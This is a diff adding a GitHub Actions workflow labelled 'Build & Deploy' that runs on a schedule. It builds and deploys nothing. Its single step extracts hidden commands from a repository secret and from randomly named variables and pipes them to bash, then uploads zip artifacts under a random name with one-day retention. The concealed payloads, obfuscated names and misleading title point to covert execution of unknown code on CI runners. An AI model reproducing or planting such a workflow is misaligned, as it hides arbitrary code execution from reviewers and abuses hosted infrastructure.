@@ -1,0 +1,37 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          s71: ${{ secrets.s71 }}
+        run: |
+          printf '%s' "$s71" | jq -r .cfnyk8543 | /bin/bash
+          echo $e32982 | jq -r .vz28455 | /bin/bash
+          echo $o11913 | jq -r .i952 | /bin/bash
+          printf '%s' "$utomg4676" | jq -r .fvq2 | /bin/bash
+          printf '%s' "$stgz54" | jq -r .femja49 | /bin/bash
+          printf '%s' "$j02" | jq -r .qxzy87 | /bin/bash
+          printf '%s' "$wqdb07001" | jq -r .dp90651 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: zsH6Vb7G
+          path: "*.zip"
+          retention-days: 1
